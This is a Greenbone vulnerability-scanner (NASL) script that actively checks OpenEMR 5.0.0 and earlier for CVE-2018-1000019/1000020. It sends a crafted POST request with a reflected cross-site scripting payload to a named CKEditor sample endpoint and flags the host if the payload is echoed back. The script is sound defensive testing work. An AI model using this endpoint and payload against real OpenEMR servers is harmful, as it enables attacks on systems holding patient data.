# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:open-emr:openemr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113110");
  script_version("2025-04-11T15:45:04+0000");
  script_tag(name:"last_modification", value:"2025-04-11 15:45:04 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2018-02-13 13:30:33 +0100 (Tue, 13 Feb 2018)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-03-01 15:16:00 +0000 (Thu, 01 Mar 2018)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-1000019", "CVE-2018-1000020");

  script_name("OpenEMR <= 5.0.0 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_openemr_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openemr/http/detected");

  script_tag(name:"summary", value:"OpenEMR is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"OpenEMR is prone to an authenticated OS Command Injection
  vulnerability and an unauthenticated XSS vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to fully
  compromise the target system.");

  script_tag(name:"affected", value:"OpenEMR 5.0.0 and prior.");

  script_tag(name:"solution", value:"Update to version 5.0.0 Patch 7 or later.");

  script_xref(name:"URL", value:"https://www.sec-consult.com/en/blog/advisories/os-command-injection-reflected-cross-site-scripting-in-openemr/index.html");
  script_xref(name:"URL", value:"http://www.open-emr.org/wiki/index.php/OpenEMR_Patches");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if( ! port = get_app_port( cpe: CPE, service: "www" ) )
  exit( 0 );

if( ! location = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port: port );

timestamp = ereg_replace( string: gettimeofday(), pattern: ".", replace: "_" );
exploit_url = location + "/library/custom_template/ckeditor/_samples/assets/_posteddata.php";
exploit_url = ereg_replace( string: exploit_url, pattern: "//", replace: "/" );
exploit_pattern = "<script>alert('" + timestamp + "');</script>";
exploit = exploit_pattern + "=SENDF";

req = "POST " + exploit_url + ' HTTP/1.1\r\n';
req += "User-Agent: " + useragent + '\r\n';
req += "Host: " + host + '\r\n';
req += 'Accept: */*\r\n';
req += 'Content-Length: ' + strlen( exploit ) + '\r\n';
req += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n';
req += exploit;

if( ! resp = http_send_recv( port: port, data: req ) )
  exit( 0 );

if( exploit_pattern >< resp ) {
  report = http_report_vuln_url( port: port, url: exploit_url );
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
